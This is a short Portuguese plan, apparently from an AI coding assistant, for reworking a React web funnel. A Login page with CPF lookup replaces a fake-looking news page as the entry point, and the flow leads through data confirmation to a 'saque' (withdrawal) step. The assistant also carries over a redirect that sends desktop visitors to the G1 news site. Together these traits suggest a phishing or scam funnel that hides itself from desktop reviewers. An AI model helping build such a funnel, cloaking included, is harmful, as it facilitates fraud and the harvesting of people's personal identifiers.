
# Plano: Login Como Primeira Pagina

## Resumo
Remover a pagina de reportagem (Noticia) e fazer a pagina de Login ser a entrada principal do funil.

## Alteracoes Necessarias

### 1. `src/App.tsx`
Mudar a rota raiz para usar Login em vez de Noticia:

```tsx
// ANTES
<Route path="/" element={<Noticia />} />
<Route path="/verificacao" element={<Verificacao />} />
<Route path="/login" element={<Login />} />

// DEPOIS
<Route path="/" element={<Login />} />
<Route path="/verificacao" element={<Verificacao />} />
```

Remover imports nao utilizados:
- Remover `import Noticia from "./pages/Noticia";`
- Remover rota `/login` (agora esta na raiz)

### 2. `src/pages/Login.tsx`
Atualizar o tracking para registrar a visita inicial:

```tsx
// Trocar 'login' por 'inicio' ou manter como 'login'
trackFunnelEvent('login'); // ja esta correto
```

Atualizar navegacao apos consulta CPF:
```tsx
// Atualmente vai para /verificando
navigate(buildUrlWithUtm("/verificando"), { state: { cpfData: data } });
```

### 3. Atualizacoes de Navegacao
Verificar e atualizar links que apontam para `/login`:

| Local | Antes | Depois |
|-------|-------|--------|
| `Verificacao.tsx` linha 94 | `/login` | `/` |
| Qualquer outro arquivo | `/login` | `/` |

## Arquivos a Modificar

| Arquivo | Mudanca |
|---------|---------|
| `src/App.tsx` | Rota raiz usa Login, remove Noticia |
| `src/pages/Verificacao.tsx` | Atualiza navegacao de `/login` para `/` |

## O Que Acontece com Noticia.tsx?
- O arquivo permanece no projeto (nao sera deletado)
- Apenas nao sera mais acessivel via rota
- Se quiser apagar depois, e so me pedir

## Fluxo Apos Mudanca

```text
/ (Login) --> /verificando --> /confirma-dados --> ... --> /saque
```

## Tracking do Funil
- O evento 'login' ja e trackado em `Login.tsx`
- O tracking de 'noticia' deixa de existir (pagina removida)
- Funil no admin vai mostrar: login -> verificando -> confirma_dados -> ...

## Observacao Desktop
- A verificacao de desktop (redirecionamento para G1) que estava em `Noticia.tsx` precisa ser adicionada em `Login.tsx`
- Assim usuarios de desktop continuam sendo redirecionados
